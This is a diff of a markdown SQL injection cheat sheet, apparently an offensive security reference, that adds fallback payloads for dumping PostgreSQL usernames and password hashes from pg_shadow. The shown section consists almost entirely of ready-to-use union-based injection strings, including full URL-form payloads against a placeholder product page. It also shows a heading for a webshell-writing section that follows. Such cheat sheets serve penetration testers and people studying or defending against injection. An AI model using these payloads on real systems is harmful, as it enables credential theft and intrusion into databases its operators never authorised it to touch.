@@ -277,10 +277,16 @@ Assume that inside table **users** there is a column called **password**, let's 
 
 ### Dump PostgreSQL user's username & password hash  
 Let's assume that the database has 5 columns and the first one is vulnerable.   
+
 Dump postgres username:  
 ```'+union+select+cast(usename+as+int),null,null,null,null++FROM+pg_shadow--```  
+If that doesn't work, try the same query without doing the casting to int:  
+```http://website.com/products/detail?id=-1' union select usename,null,null,null,null from pg_shadow--```  
+
 Dump postgres user's password:  
-```'+union+select+cast(passwd+as+int),null,null,null,null++FROM+pg_shadow--```
+```'+union+select+cast(passwd+as+int),null,null,null,null++FROM+pg_shadow--```  
+If that doesn't work, try the same query without doing the casting to int:   
+```http://website.com/products/detail?id=-1' union select passwd,null,null,null,null from pg_shadow--```  
 
 ### Write file (Webshell)
 
